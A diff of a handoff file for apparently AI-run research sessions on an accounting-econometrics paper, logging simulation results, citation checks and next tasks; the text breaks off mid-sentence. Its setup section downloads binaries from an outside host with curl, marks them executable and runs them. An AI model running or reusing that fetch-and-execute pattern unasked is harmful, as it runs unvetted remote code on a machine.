@@ -1,8 +1,8 @@
 ---
 project: wealth-tensor
-gh_sha: baea5f148cd39e19ec188de2a4f6639fbb90b5d1
+gh_sha: cc1d19885c64d525bd6dcc238d03dc2399f2bb57
 updated: 2026-08-12
-session: wealthTensor-13
+session: wealthTensor-14
 gate_passed: true
 gate_version: "2.50"
 ---
@@ -20,26 +20,33 @@ curl -s https://system.europeanflorist.com/dsh/darlish-up -o /tmp/darlish-up && 
 
 Post the printed `DARLISH-ENROLL v1 id=… fp=…` line **exactly** as a comment on Asana task
 `1217316841710435` via the session's Asana MCP, then run `/tmp/darlish-up` again to collect.
-**Re-run before diagnosing.** *First collect has now worked in -06 through -13, without exception.*
-Cycle ~4 min.
+**Re-run before diagnosing.** *First collect has worked in `-06` through `-14` without exception.*
+Cycle ~4 min; `-14` was READY inside two minutes and the bridge rotated zero times all session.
 
 ```
 curl -s https://system.europeanflorist.com/dsh/dx -o /tmp/dx && chmod +x /tmp/dx
-/tmp/dx '~/Scripts/roster join --who big-wealthTensor-14 --task "<what you are doing>"'
-/tmp/dx '~/Scripts/roster claim --who big-wealthTensor-14 --resource wealth-tensor'
+/tmp/dx '~/Scripts/roster join --who big-wealthTensor-15 --task "<what you are doing>"'
+/tmp/dx '~/Scripts/roster claim --who big-wealthTensor-15 --resource wealth-tensor'
 ```
 
 `export LESSONS_CONTRIBUTOR=opus` **before any `lessons.py add`** — without it a leaf can reach
-`active` but never `trusted`, because independence is unprovable after the fact.
+`active` but never `trusted`.
 
-**Never inline a multi-line commit message in a `dx '...'` argument.** One apostrophe closes the
-quote and `git commit` succeeds with a truncated message while the shell errors about the leftovers.
-Write it to a file, `--put` it, `git commit -F`. Used five times this session, no incidents.
+**Never inline a multi-line commit message in a `dx '...'` argument.** Write it to a file, `--put`
+it, `git commit -F`. Used six times this session, no incidents. `printf '%s\n' ...` into a local
+file then `--put` is the cheapest form.
 
 `dx --get` fails on binary — base64 both ways. Quote remote paths. Give long `dx` calls five
 minutes. Exit 3 = never reached darwin, safe to re-run; exit 4 = started, check state first.
 
-### The editing tool that made this session cheap — use it
+**Known noise, already carded — do not debug it.** Every commit in a claimed repo prints
+`ROSTER CONTENTION — wealth-tensor is ALSO claimed by: big-wealthTensor-14`, naming *you*. The
+commit hook identifies the session from `DARLISH_SESSION` (the transport id, `cloud-XXXX`) while
+`roster join --who` records the name you chose, so one session occupies two rows and contends with
+itself. Diagnosed and filed on **State Machine `1217420907841952`** with three candidate fixes.
+`~/Scripts` was claimed by a live sibling, which is why it is teed up rather than fixed.
+
+### The editing tool that makes this project cheap — use it
 
 Do **not** edit the manuscript with `sed`, heredocs, or in-place regex. Write a Python patch script
 locally, `--put` it, run it. Every edit is an exact-string replacement that **counts its anchor and
@@ -53,280 +60,219 @@ def sub(label, old, new):
     src = src.replace(old, new); edits.append(label)
 ```
 
-Six patch scripts, twenty edit sites, two anchor failures — both caught *before* anything was
-written, both line-wrap mismatches, both fixed in one round trip. The file is never left
-half-patched, because nothing is written until every anchor resolves. `scripts/patchkit.py` exists
-and is worth reading, but this four-line guard is the whole trick.
+Twelve edit sites across two manuscript patches this session, **zero anchor failures** — because of
+the one habit `-13` paid two round trips to learn and this session followed: the manuscript is
+hard-wrapped at ~100 columns, so **`sed` the region to a local file and copy the wrapping out of
+it** rather than composing an anchor from memory.
 
-**Anchor gotcha, since it cost two round trips:** the manuscript is hard-wrapped at ~100 columns, so
-an anchor you compose from memory will have the newline in the wrong place. Grep the region and copy
-the wrapping exactly.
+**The trap that DID cost two round trips here, and it is new.** `severity.check()` **executes its
+witness immediately**. A witness lambda referencing a helper defined *later* in the file raises
+`NameError` at the check, not at import — so the script dies halfway through a run that has already
+printed twenty seconds of results. **Define every helper a witness touches ABOVE the first check
+that uses it.** Hit twice, ten minutes each.
 
-## 1 · WHAT HAPPENED — §4.6's OPEN QUESTION IS CLOSED, AND THE ANSWER IS BETTER THAN A YES
+## 1 · WHAT HAPPENED — §4.4's HEADLINE WAS CARRYING AN ASSUMPTION, AND SO WAS §4.5's
 
-`-12` named the returns question in print as the sharpest thing the identification result raises, and
-could not answer it. It is answered. **Yes, returns break the equivalence** — and the interesting
-half is *how*, because the mechanism is not the one the question presupposed.
+`REG-002` registered and pushed before a line of the instrument existed;
+`scripts/wt088_disclosed_ladder.py` — **14 severe · 0 definitional · 0 vacuous**; 124 tests green
+(was 121); coach ratchet unchanged at **6**.
 
-`scripts/wt085_returns_conditioning.py` — **7 severe, 0 vacuous**, 121 tests still green.
+§4.4 said *the ranking does not merely blur, it inverts.* Both figures behind it — Kendall τ = −1
+at the tabulated ladder, 1.9% recovery over 4,000 ladders — were computed under **two** constraints
+imposed jointly: observability falls up the ladder (the design), and durability rises up it (an
+inference from the standards' *scheduling* behaviour). **Drop the second and mean τ goes −0.414 →
++0.318.** Not weakened. Reversed.
 
-**Returns kill the small degeneracy on sight.** The mirror firm's asset decays at α rather than δ,
-so two worlds whose books agree to 7 × 10⁻¹⁶ differ in return by α − δ — three percentage points a
-year, indefinitely. §4.7 predicted this. It is the smaller half.
+**So dispersion and ordering do different damage, and the paper had them fused.** δ dispersion
+*destroys* the ranking — recovery falls from 100.0% at a common δ to 11.5% with no ordering at all.
+The ordering is what turns the wreckage into a *reversal* — 23.8% against 1.1%. §4.4 now claims the
+region and reports the corner.
 
-**Returns cannot touch the large one, and the reason is one line.** Grant an analyst *both roots
-exactly* — strictly more than returns supply — and `wt084`'s continuum is untouched: φ still sweeps
-[0, 1] with the reported series exact to 2 × 10⁻¹⁶, and every member of the family emits the
-**identical return series, bit for bit** (2 × 10⁻¹⁶). **A return is a ratio, and the residual
-degeneracy is a degeneracy in scale.** Ratios do not carry scale. No quantity of returns data bears
-on it — not weakly, not asymptotically, not with a longer panel.
+**The corner is a knife edge in its own top rung.** Goodwill and indefinite-lived intangibles cross
+in closed form at **δ₃\* = Kα/(1 + K) = 0.00789** — an eighty-seven-period half-life, verified
+against bisection to 1 × 10⁻⁹. The table assigns 0.002.
 
-**What breaks the continuum is the NEWS, not the returns.** The degeneracy was a property of a
-*noiseless* economic path. Once the realised decline rate varies period to period, matching the
-driving term needs cα = α and cφ′ = φ simultaneously, which forces c = 1. Regressing the reported
-series on its own lag, the return-implied path and that path's first difference recovers α, E₀ and φ
-to 10⁻¹⁶ at σ = 0.15, against a design matrix that is **exactly singular at σ = 0**. Returns matter
-because they are how the analyst *learns* the news.
+**And "unscheduled" read as "slow" errs twice in the same direction.** At an *identical mean rate*
+(δ = 0.20 with probability 0.05) realised deferral is **1.303×** the closed form at that mean
+(se 0.002, 2,000 paths) — a δ-equivalent of 0.0123, **above the crossing.** Measured, not argued
+from the convexity of δ/(α − δ).
 
-**And the price is a rate, not a proof** — a two-factor one, which took three scripts to get right.
-`wt086` killed the idea that either degradation exponent is a model constant (collinearity spans
-−1.07 to −0.38 across nine (α, δ) settings; se(φ̂) spans −0.78 to −0.09), so the manuscript quotes
-ranges. `wt087` then separated what `wt086` had confounded: **the rate GAP (α − δ) sets the standard
-error's level; the decay rate δ sets how strongly that level responds to volatility, and the response
-CHANGES SIGN** — exponent −0.39 at property's δ, **+0.16** at goodwill's. Below about δ = 0.01 more
-news makes the estimate *worse*. That is the one place in the paper where §4.7's repair runs
-backwards.
+**The disclosed-numbers repair the at-bat asked for does not land where anyone expected.** ASC 360
+and ASC 350-30-50 disclose useful lives, so δ for two rungs needs no inference — but **R exists only
+for δ < α, and at α = 0.05 the entire disclosed rectangle is outside the model's domain.** Every
+useful life short enough to appear in a filing implies a decay rate at or above the recognition
+rate. Half the rectangle is admissible only at α ≈ 0.19, all of it above α = 0.33. Asked at an α
+where the question has a domain, the first rung **rises in 99.7%** of the rectangle: the table is
+wrong at its first step on published numbers.
 
-**The sample cannot compensate, and this is the best thing in the script.** The root-T rate is
-**never attained at any horizon**: T 50 → 200 buys 1.22× where root-T buys 2.00×, and T 400 → 1600
-buys *nothing measurable*. Every term in the estimating equation — signal, regressors and accrual
-noise alike — is proportional to the asset's remaining value, so once the asset has decayed the
-later periods are not noisy observations but **absent** ones. **The information about recognition
-speed is a property of the asset: how much its value moves, and how long it goes on existing. The
-analyst chooses neither.**
+**A fitted design rule somebody else can use.** With *budget* = mean per-rung Δlog(1 − φ) and
+*δ leverage* = mean per-rung |Δlog δ − Δlog(α − δ)|, P(the design fails) is logistic in
+log(leverage/budget), slope **+1.58** (se 0.081, z = +19.5; permuted-outcome witness z = **0.23**),
+crossing one half at **0.61**. The tabulated ladder sits at **2.58**.
 
-**The finding that runs FOR the field.** The variation identifying φ in this filter is return
-variation — the same variation Basu's regression needs in order to run at all. An instrument
-conditioning on returns is drawing on exactly the right information, and the return-variance
-corrections the literature reached for empirically are operating on the *identification-strength
-parameter* rather than on a nuisance. That is a defence of somebody else's specification arrived at
-from outside it, and it is rarer than another teardown.
+**§4.5's survivor does not survive it either.** The lag ordering holds in 100% of 400 ladders drawn
+under the same two constraints; unordered it is **66.2%** (M = 2,000, se 0.011), 3.55 se below the
+0.70 threshold registered blind. The concession is **narrowed, not withdrawn** — lag is still better
+by a factor of six against the magnitude measure's 11.5%.
 
-## 2 · TWO CHECKS FAILED, AND BOTH FAILURES WERE WORTH MORE THAN THE ASSERTIONS
+## 2 · TWO REGISTERED FALSIFIERS WERE THEMSELVES WRONG, AND THAT IS THE REUSABLE PART
 
-Recorded because it is the reusable part.
+Recorded as errata in `REG-002` §5 and `RESULT-REG-002.md`, never rewritten.
 
-**E5 was written asserting se ~ 1/σ**, from a back-of-envelope argument about the third regressor's
-orthogonal variation. The run refused, twice. The first refusal exposed a **modelling error**:
-accrual noise in fixed units of E₀ on a *multiplicative* path is relatively invisible when the firm
-is large and overwhelming when it is small, which manufactures a U-shaped standard error out of
-nothing and reads exactly like a substantive finding. The second refusal exposed that the envelope
-had ignored the first regressor. The exponents are now **fitted and reported**, not asserted.
+**E1's threshold was stated on |mean τ|.** An absolute value **cannot distinguish an effect that
+vanished from one that changed sign.** Measured +0.318 against a ±0.10 band, so the registered test
+*as literally written* returns "the inversion survives" — the exact opposite of what the number
+says. The symmetric band **feels** conservative because it looks like it guards both directions; it
+is the one shape blind to the most interesting outcome a directional hypothesis has.
 
-**E6 was written asserting root-T** and found the saturation instead — the best result in `wt085`,
-and it exists only because the check was severe enough to fail.
+**E4's threshold was a share of a set that turned out to be empty.** Not passed, not failed —
+reporting "does not fire" would have been a phantom tag at section scale. And **E6, registered as a
+boundary check on a corner of the parameter space, is not a corner: it is where the disclosed
+numbers all live.**
 
-**`wt086` E2 made it three.** It was written expecting the collinearity exponent to be a constant of
-the problem, on the argument that the third regressor's departure from proportionality with the
-second *is* the innovation, so conditioning should be reciprocal in σ wherever the roots sit. It is
-not: the exponent collapses toward −0.4 when α and δ are close, a case the argument had no term for.
-Three for three. **When a scaling argument feels too clean to need checking, that is the tell.**
+**The generalisation, and it is the mirror image of WT-052.** That rule covers a check appended
+*after* the numbers arrive. This is a check specified so that **no number can address it.** A
+falsifier can fail two ways before it ever runs, and both are visible at registration time for one
+sentence each:
 
-**`wt087` made it five, and the last two were the most expensive.** It was written to measure how
-fast identification fails as δ → 0 and found that it does not fail: the standard error *improved* as
-decay slowed. Chasing that inversion found (i) that §4.8's limit needed a motionless asset rather
-than a slow one, and (ii) that every δ sweep in the corpus, `wt086`'s included, had been moving the
-rate gap at the same time and attributing its effect to δ. **A sweep that moves two parameters at
-once has measured neither**, and the tell is two sweeps that appear to contradict each other — they
-are usually statements about different quantities. Both banked globally.
+> **Which outcomes does this threshold fail to separate?**
+> **Is the set I am taking a share of guaranteed non-empty?**
 
-**The rule, banked globally: FIT THE EXPONENT, DO NOT ASSERT IT.** A scaling argument for a
-simulated quantity is a hypothesis. Write the check as a fitted log-log slope with a reported value.
-A check that encodes the guess cannot discover the guess is wrong.
-
-**Symptom worth memorising:** a metric non-monotone in a parameter you expected to be monotone is
-almost always your noise specification, not the world.
+Both banked globally, with the pole-horizon numerics leaf, in `claude-blackbook` (pushed).
 
 ## 3 · THE PAPERS
 
-**Paper III** — `docs/papers/paper-III-dual-tensor/paper-III.md`, **2,075 lines**. Prior version at
-`paper-III.md.bak-pre-wt085`. §4.1–4.8 numbering preserved again; nothing renumbered.
+**Paper III** — `docs/papers/paper-III-dual-tensor/paper-III.md`, **2,137 lines** (was 2,075). Prior
+version at `paper-III.md.bak-pre-wt088`. Numbering preserved; nothing renumbered.
 
 | § | what changed |
 |---|---|
-| 4.2 | **Nerlove (1958) lineage added alongside Bateman** — the economics-native instance. Kuan citation **corrected** (see §4) |
-| 4.4 | **Fisher & McGowan (1983) adopted as the rhetorical ancestor**, with its fate attached |
-| 4.6 | third qualification **narrowed** from open question to pointer; **Dutta & Patatoukas (2017) separated explicitly**; Ryan (2006) title collision closed; δ-notation collision named |
-| 4.7 | **the returns repair, with its price**, ahead of the disclosed-useful-lives repair. IV-reference-dose claim **re-sourced**. Exponents **ranged, not quoted**, after `wt086` |
-| 4.8 | **rewritten and demoted** — the limit belongs to a *motionless* asset, not a slow one, and what survives about goodwill is a fact about the model's determinism |
-| 4.4 | the δ ladder **named as an assumption** for the first time, and the inversion reported as the conditional result it always was |
-| 9 | Limitation 3 sharpened — the determinism is not innocuous, and §4.8 is where it bites |
-| 7 | four survivals rows |
-| — | abstract and contribution 3 updated. Bibliography largely closed from Jason's `journals/` folder: five entries **read at source**, one phantom record deleted, two ancestors added |
+| 4.4 | **heading and closing third replaced** — "The design has a validity region, and the disclosed numbers fall outside it". Dispersion/ordering separated; the fitted boundary; the crossing rate; the lumpy result; the disclosed-life boundary; the domain restriction |
+| 4.5 | the 100% figure now carries its unordered companion (66.2% vs 11.5%); the concession narrowed, not withdrawn |
+| 4.2 | **Bellman & Åström narrowed** to the transfer-function definition — nothing readable in that source supports the unordered-pair statement in their mouths. The pole-set consequence is now drawn in the paper's own voice, where it can be checked |
+| — | abstract, contribution 3, and **six new rows** in the §7 survivals ledger |
 
-**Paper II** — **the free Road One paragraph is written.** §3.1. At matched budget the stock levy
-moves Var[log a] by 6 × 10⁻⁶ — 0.076542 → 0.076536, i.e. not at all — while the flow levy cuts it to
-0.051189. The stock base **truncates the outcome**, the flow base **damps the generator**, and both
-register as a smaller Gini, which is why the distinction is invisible in the statistic normally
-reported. It survived two handoffs unclaimed; it is claimed.
+**Net defensive prose is DOWN.** The ten-line "the ladder is an assumption" paragraph is gone,
+replaced by five positive results with numbers in their own units, and a §4.5 clause narrating the
+paper's own draft history was deleted (charter §3.3). **The ratchet is unchanged at 6 — the
+additions were paid for by the deletions**, which is the mechanism charter §7 asks for.
 
-## 4 · THE REFERENCE WORK — ONE CITATION REFUTED ITSELF
+**Three tests §4.4 needed and did not have** (`tests/test_lag.py`): the crossing-rate closed form
+against bisection; the first-rung boundary at six rates rather than the published one; the domain
+restriction. **Writing the third found what the run had not:** convergence to the closed form
+**slows without bound as δ → α** — at δ = 0.045 the 400-period ratio is still 11% short of its own
+limit. Past the pole growth is exactly log((1 − α)/(1 − δ)) per period, pinned only just past it:
+by δ = 0.100 the ratio hits 10⁹⁴ by period 4,000 and a longer check measures float64's exponent
+range rather than the model.
 
-Two load-bearing references were abstract-level and both freely available. Read at source.
+## 4 · THE REFERENCE WORK — ONE ATTRIBUTION NARROWED BEFORE A REFEREE COULD NARROW IT
 
-**Kuan, Wright & Duffull (2023) — the citation was WRONG and is fixed.** §4.2 had them classifying
-flip-flop as a failure of ***global*** rather than local identifiability. The paper says the
-*opposite adjective*: "an issue of **local** identifiability in that there exists a finite set of
-parameter values (rather than a single set) that solves the problem." Same taxonomy, wrong word in
-their mouths, findable by any referee in their first paragraph. Their own qualification is now
-carried too — the competing solutions are "not simply a function of swapping the rate constants" but
-a partial permutation, n + 1 for an n-compartment model — and it *helps*: the accounting case, where
-the exchange is a clean root swap, is the simplest member of the family rather than the general one.
+Both `-13`'s remaining abstract-level items were run down in parallel with the writing.
 
-**Also fixed: §4.7 asserted, uncited, that flip-flop is resolved by an intravenous reference dose.**
-Kuan et al. do not say it. Re-sourced to what they do say — that it is "in the absence of intravenous
-data" that elimination covariates load onto absorption parameters — plus their own remedies. The
-analogy is unharmed and now rests on read text.
+**Garrett (1994) — HELD, and it is stronger than the entry claimed.** *J. Pharmacokinetics and
+Biopharmaceutics* 22(2), 103–128, DOI 10.1007/BF02353538, confirmed against Springer, Crossref,
+OpenAlex and PubMed. **Its abstract states flip-flop verbatim** — *"'Flip-flop,' the interchange of
+the values of the evaluated rate constants, occurs when ke > 3ka"* — so the §4.2 citation rests on
+read text. **Bibliography trap:** in 1994 the journal was *Journal of Pharmacokinetics and
+Biopharmaceutics*; Springer's own page displays the post-2001 name *…and Pharmacodynamics*. The
+manuscript has the 1994 name and must keep it. No free full text; not open access.
 
-**Ball, Kothari & Nikolaev (2013 JAR) — characterisation HELD.** Their §4.4 is headed "Other
-Determinants of Conditional Conservatism" and the determinant reading is explicit in their
-conclusion. Asset maturity is one of several examples of a comparative static in their σx, not their
-headline; §4.6 already reads that way. **Bibliography trap:** the MIT deposit is handle
-**1721.1/87767**; 87766 is the *different* 2013 BKN paper in *The Accounting Review*.
+**Bellman & Åström (1970) — the attribution was too strong and is FIXED.** *Mathematical
+Biosciences* 7(3–4), 329–339, DOI 10.1016/0025-5564(70)90132-X, confirmed against Crossref,
+OpenAlex and Lund's institutional record. **Nothing readable supports putting the unordered-pair
+statement in their mouths** — the paper is paywalled and every accessible description, including
+Lund's own abstract, covers the *definition* of structural identifiability and the transfer-function
+criterion. Six citing sources checked; none describes them treating root exchange. §4.2 now cites
+them for what they demonstrably do and draws the pole-set consequence itself. **Same animal as the
+Kuan adjective, one costume over: a source credited with a consequence of its method rather than
+with its method.** *(Issue number: Crossref and OpenAlex say 7(3–4); several reference lists say
+7(3) or omit it. 7(3–4) is what the structured metadata supports.)*
 
-**Dutta & Patatoukas (2017) was the live threat and is now separated in print.** Read at source
-(open UCLA working-paper text). It is a **bias** claim, not an identification one, and the proof is
-internal: their recognition parameter stays recoverable from the accrual-variance spread, which is
-the repair they propose. **A claim a better statistic can repair is a claim about a statistic.**
-Their three confounders are news-process properties — expected returns, cash-flow persistence,
-return skewness — and their firm is a cash-flow stream with **no capitalised asset in it**, so the
-object of our theorem has no representation in their model. Their δ is **our φ**; the collision is
-named once, in §4.6, at first use.
-
-**Jason's `~/Desktop/downloads/journals/` folder closed most of the bibliography.** Eleven PDFs,
-all clean on `provenance_check.py`. Five references upgraded to **read at source** — Basu (1997),
-which had been closed everywhere; Beaver & Ryan (2000); Jin & Myers (2006); Ryan (2006); and a new
-Beaver & Ryan (2005). Three things came out of the reading and none was expected:
-
-- **A phantom record.** The list carried *two* Dutta & Patatoukas entries with different
-  bibliographic data — a pre-existing TAR 91(5), 1407–1436, 2016 and today's TAR 92(4), 191–216,
-  2017. The 2017 is correct; the 2016 is a phantom and is deleted. Another for METHOD-001's family
-  portrait, and it surfaced only because the duplicate forced a look.
-- **§9's flagged quotation is verified.** Jin & Myers's "For simplicity, we ignore depreciation and
-  reinvestment" is in the typeset article at **p. 262**, character for character. The warning that
-  the referee process might have altered it is retired. Their **footnote 3** is the bonus: they set
-  aside depreciation "according to a pre-defined schedule" as an easy extension, and that schedule's
-  interaction with timeliness is exactly what §4.2 shows a series cannot resolve.
-- **Two ancestors nearer than the pharmacokinetics.** Beaver & Ryan (2000) p. 135 decompose
-  book-to-market into a *bias* component and a *lag* component using "current and six lagged
-  security returns with fixed firm and time effects" — **§4.7's returns repair, run empirically
-  twenty-five years ago.** And Beaver & Ryan (2005) put a depreciation schedule against measured
-  conservatism in print: accelerated depreciation "preempts conditional conservatism." Both are now
-  cited, and §4.6 says plainly that theirs is a signed comparative static rather than an
-  identification claim.
-
-**Still in that folder, unread:** `ryan1995.pdf` + its erratum (at-bat item 5 — now trivial, the
-PDFs are on disk), and `zhu2016.pdf` (Wei Zhu, *Accruals and price crashes*, RAST 2016), which is
-**not cited anywhere** and may belong to §9's crash-risk thread. Also `basu1997 (1).pdf` is a
-byte-identical duplicate of `basu1997.pdf`; left alone, it is Jason's folder.
-
-**Griliches (1967) is CLOSED as a lead. Do not reopen it.** It was `-12`'s likeliest hiding place for
-an economics precedent on root-exchange non-identification. His own *Citation Classic* retrospective
-places his identification point on **error structure**, not roots, and no accessible source puts root
-exchange in that paper. The real precedent was one citation away: the **Nerlovian combined
-adaptive-expectations/partial-adjustment reduced form**, every systematic coefficient of which is
-symmetric in β ↔ γ while the disturbance γ[u(t) − (1 − β)u(t−1)] is not. **Derived and checked here**
-(`wt085` E7), not taken on report, and cited as lineage with the read-status saying exactly that.
+**Still on disk in `~/Desktop/downloads/journals/`, still unread:** `ryan1995.pdf` + its erratum
+(§4.5 and §9 both lean on Ryan's accrual model) and `zhu2016.pdf` (Wei Zhu, *Accruals and price
+crashes*, RAST 2016), uncited — decide whether §9 wants it. Run `provenance_check.py` on anything
+new. **Grep the bibliography by SURNAME before adding a reference** — `-13` found two entries for
+one paper, one a phantom.
 
 ## 5 · THE AT-BAT, RANKED
 
-1. **The off-diagonal paper** (Paper III's Limitation 9). Now the largest unclaimed thing in the
-   corpus. Co-occurrence of impairments across classes against an independence null: no observability
-   proxy, no φ-to-GAAP bridge, no new data — the **688 events already collected are enough**.
-   **Register before coding the instrument (WT-052).**
-2. **Take the σ-and-lifetime result to the data.** §4.7 now says identification strength is a
-   property of the asset, degrading as σ^−0.5 in return volatility and saturating within a few
-   half-lives. That is a *testable design rule* and the registered sample can price it: rank the four
-   GAAP classes by realised return volatility and asset life, and the theory predicts where a
-   conservatism estimate is worth reading and where it is not. Nobody has run this. It is the natural
-   empirical sequel and it needs no new data.
-3. **Restate §4.4 on the observable pair — the one piece of §4 that `wt087` opened rather than
-   closed.** §4.4 now admits its δ ladder is inferred from the standards' *scheduling* behaviour,
-   which tracks how predictable a decline is rather than how fast, and that the inversion is
-   conditional on it. That admission is honest but it is not the repair. The repair is available and
-   is a rewrite: `wt087` shows readability is governed by **α − δ**, and α is the book amortisation
-   rate — *disclosed*. §4.7 already argues the standards publish useful lives, which give δ for two
-   of the four rungs directly. A §4.4 built on (disclosed α, disclosed life) instead of an inferred
-   δ ladder would rest on published numbers rather than on an inference the paper itself forbids,
-   and would let a reader locate their own firm. **Register the reframing before coding it (WT-052)**
-   — it changes what §4.4 claims, not merely how it says it.
-   *One thing to check first, because it decides how much of §4.4 survives:* if goodwill's true δ is
-   large-but-lumpy rather than near zero, does the τ = −1 inversion hold at all? Draw the 4,000
-   ladders again without the durability-rises assumption and see. That is a half-hour job and it is
-   the honest test of the section's headline.
-4. **Finish the bibliography — it is nearly done and the hard part is over.** Three items:
-   `ryan1995.pdf` and its erratum are **already on disk** in `~/Desktop/downloads/journals/` and
-   just need reading (§4.5 and §9 both lean on Ryan's accrual model); `zhu2016.pdf` is there too and
-   is uncited — decide whether §9 wants it. Then Garrett (1994) and Bellman & Åström (1970), the two
-   still abstract-level and still load-bearing in §4.2, which are **not** in the folder and need
-   finding. Kuan taught the lesson the hard way: **the one you do not check is the one with the
-   inverted adjective.** Run `provenance_check.py` on anything new.
-6. **Two unread items the search flagged as possibly fatal to the Nerlove framing** — if either says
-   the ambiguity out loud in print, the lineage claim needs restating, and better to find it
-   ourselves: **Askari & Cummings (1977)**, *IER* 18(2), the survey of the Nerlove literature; and
-   **McManus, Nankervis & Savin (1994)**, *J. Econometrics* 62(2), "Multiple optima and asymptotic
-   approximations in the partial adjustment model" — "multiple optima" is exactly the symptom a
-   permutation non-identification produces. Both paywalled; neither is a blocker.
+1. **THE OFF-DIAGONAL PAPER** (Paper III's Limitation 9). Now unambiguously the largest unclaimed
+   thing in the corpus, and `-14` did not touch it. Co-occurrence of impairments across classes
+   against an independence null: no observability proxy, no φ-to-GAAP bridge, no new data — the
+   **688 events already collected are enough**. **Register before coding the instrument (WT-052)**,
+   and read `REG-002` §5's errata first: this session's two registration defects are both shapes an
+   independence-null registration can repeat.
+2. **THE RECOGNITION RATE IS NOW THE OPEN EMPIRICAL QUESTION, AND §4.4 SAYS SO IN PRINT.** `-14`
+   closed §4.4 by establishing that the deferral measure exists only where α > δ and that **no
+   disclosed useful life short enough to appear in a filing satisfies that at α = 0.05.** The
+   paper's α was never estimated; it was calibrated. Half the disclosed rectangle needs α ≈ 0.19 and
+   all of it α > 0.33. **What is α empirically?** It is the rate at which a deferred loss is
+   recognised, and the registered 688-event sample plausibly prices it — time from an unrecognised
+   gap opening to a charge. This is the natural sequel to §4.4 and it is now load-bearing for the
+   section's own domain sentence rather than optional.
+3. **Take the σ-and-lifetime result to the data** (`-13`'s item 2, untouched). §4.7 says
+   identification strength is a property of the asset. Rank the four GAAP classes by realised return
+   volatility and asset life; the registered sample can price it. No new data. Nobody has run it.
+   **Note the interaction with item 2:** the same sample serves both, so run them together.
+4. **Finish the bibliography** — §4 above. Two PDFs on disk, then Garrett/Bellman are DONE.
 
 ## 6 · WHAT NOT TO DO
 
 - **Do not restore the neat sentence.** *"PRE-001 was doomed by the φδ confound"* is false; `wt082`,
-  `wt083` and the survivals ledger all assert its negation.
-- **Do not re-claim the mathematics.** Bateman/flip-flop is conceded in §4.2 on purpose, and Nerlove
-  now stands beside it. A session that "strengthens" the paper by removing a concession is undoing
-  the two most valuable things `-12` and `-13` did.
-- **Do not restore "global rather than local identifiability" to the Kuan citation.** It is the
-  wrong adjective and the source is open — see §4.
-- **Do not hand Jason a ranked list of problems as a deliverable.** WT-079. **Do not run a pure
-  teardown.** WT-078 — the brief includes the whitespace or it does not ship.
+  `wt083`, the survivals ledger and now `wt088` E7 all assert its negation. **E7 narrowed the
+  MARGIN of the lag statistic's survival; it did not restore that claim.** 66.2% against 11.5% is
+  still a factor of six.
+- **Do not re-claim the mathematics.** Bateman/flip-flop is conceded in §4.2 on purpose; Nerlove
+  stands beside it. A session that "strengthens" the paper by removing a concession undoes the most
+  valuable thing `-12` and `-13` did.
+- **Do not restore "global rather than local identifiability" to the Kuan citation**, and **do not
+  restore the unordered-pair statement to Bellman and Åström.** Both are the wrong claim in
+  somebody's mouth; the second was fixed this session.
+- **Do not reopen Griliches (1967).** Closed with evidence.
+- **Do not hand Jason a ranked list of problems as a deliverable** (WT-079). **Do not run a pure
+  teardown** (WT-078).
 - **Do not invoke Mayo, severity or error-statistical philosophy as a *warrant*.** Pragmatic
   justification.
-- **Do not ask him to submit anything.** **Never add a free parameter to absorb an objection**
-  (refused six times).
+- **Do not ask him to submit anything.** **Never add a free parameter to absorb an objection.**
 - **Do not rewrite or summarise the charter inside a handoff.** Read it; it is binding.
+- **Do not polish §4.4.** It has now been rewritten whole twice. The next session that touches it
+  should be running item 2 or reading a reference.
 
-## 7 · TWO THINGS THAT WILL BITE YOU, FIXED HERE SO THEY DO NOT
+## 7 · THINGS THAT WILL BITE YOU, FIXED OR CARDED HERE SO THEY DO NOT
 
-1. **The coach ratchet counts the BIBLIOGRAPHY.** `handoff_gate.py --coach` measures conduct
-   narration "outside §§6–11," and the reference list is outside §11. A reference entry that
-   narrates its own correction — *"an earlier draft had them classifying…"* — moves the ratchet from
-   6 to 7 and is a blocker. State what the source says; do not perform the revision. **Adding a
-   section means deleting narration elsewhere, not refreshing `docs/.coach-baseline.json`.**
-2. **`gate-selfcheck.sh` will likely fail on things that are not yours.** It failed at this session's
-   wrap on an uncommitted `HANDOFF-floristAlix-2.md` in `~/Desktop/downloads` and on a `card-lint`
-   stale reference — both belonging to a **sibling session mid-wrap** (`roster who` showed five live
-   cloud siblings). Do not "fix" a sibling's in-flight artifact; check `roster who` first, and say in
-   the handoff whose the failure was. Nothing in `~/repos/wealth-tensor` was dirty or unpushed.
+1. **The coach ratchet counts the BIBLIOGRAPHY** and everything outside §§6–11. A reference entry
+   that narrates its own correction moves it and is a blocker. State what the source says. **Adding
+   a section means deleting narration elsewhere, not refreshing `docs/.coach-baseline.json`** — this
+   session added ~60 lines to §4.4 and stayed at 6 by deleting one conduct clause from §4.5.
+2. **`gate-selfcheck.sh`'s two long-standing failures are CLEARED.** `-13` reported an uncommitted
+   `HANDOFF-floristAlix-2.md` and a `card-lint` stale reference and correctly left both alone — a
+   sibling was mid-wrap. That session has since ended with no roster row, so `-14` adopted the
+   orphan: the file is committed with an **additive** footer naming its successor cards, and card
+   `1217398339377049` carries a reconcile comment. **Gate now reads PASS.** If it fails for you,
+   the failure is new and probably yours — check `roster who` first, and say whose it was.
+3. **`severity.check()` executes its witness immediately.** See §0.
+4. **A registered falsifier is worth one minute of adversarial reading before it is pushed.** See
+   §2. This session's two defects each cost more to report honestly than they would have cost to
+   prevent.
 
 ## 8 · DEFINITION OF DONE
 
-Three pre-prints posted. Paper III is the closest and is not blocked on argument: **§4 is finished
-work** — theorem, proof, ancestry, both degeneracies, both repairs and the price of each. §4 is
-closed as an argument: theorem, proof, ancestry, both degeneracies, both repairs, the price of each,
-and — after `wt087` — an honest account of which cases are actually hard and why. One structural
-task remains and it is **§4.4, not §4.8**: item 3 restates the cross-class result on disclosed
-numbers instead of an inferred δ ladder, and its first half-hour is a test of whether §4.4's headline
-inversion survives without its durability assumption. Everything else is empirical (item 1) or
-bibliographic (item 4), and item 4 is now mostly a matter of opening files that are already on
-disk. **Resist polishing §4** — the next session that touches it should be
-running item 3's test or reading a reference, not improving prose. It has been rewritten whole once and materially extended once; the next session that
-touches it should be adding a result or reading a reference, not improving prose.
+Three pre-prints posted. Paper III is closest. **§4 is finished work and §4.4 is now closed as an
+argument too** — theorem, proof, ancestry, both degeneracies, both repairs, the price of each, an
+honest account of which cases are hard, and, after `wt088`, an explicit validity region with a
+computable boundary and a stated domain. The structural queue is empty.
+
+**What remains on Paper III is empirical and bibliographic, not argumentative.** Item 2 is the one
